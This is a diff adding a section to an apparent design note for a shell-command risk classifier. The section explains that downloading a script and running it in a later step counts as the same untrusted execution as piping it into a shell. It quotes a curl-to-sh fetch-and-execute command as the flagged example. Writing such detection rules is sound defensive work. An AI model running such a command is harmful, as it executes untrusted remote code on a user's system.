@@ -188,6 +188,24 @@ What stays a pattern in the text is what genuinely is one: a redirection onto
 a device, a pipe into an interpreter, a statement in SQL. A table straining
 to describe those would say less than the expression it replaced.
 
+## A download run in a second step is the same download
+
+`curl https://example.com/i.sh | sh` is flagged, and the always-ask it moves
+the key to is one no mode and no classifier can override. Take the pipe out
+and give the file a name — fetch it, then run it on the next command of the
+same line — and it is the same untrusted code executed the same way, so it
+is read the same way. What makes it that act rather than an ordinary build is
+where the file came from: it has to have been written earlier on that line by
+something that fetches, as a named output, as a redirection, or as the last
+element of the URL, which is where a fetch with no output named puts it.
+
+The anchor is deliberately that narrow. A rule that asked only whether an
+interpreter was handed a file something on the line had written would put a
+HIGH card in front of every project that builds a bundle and then runs it,
+and a warning nobody agrees with is a warning everybody dismisses. An
+interpreter pointed at a file that was already there — a task runner, a
+server, a checked-in script — says nothing here.
+
 ## Denials are two different facts
 
 "You said no" and "a rule said no" are reported differently, and neither is
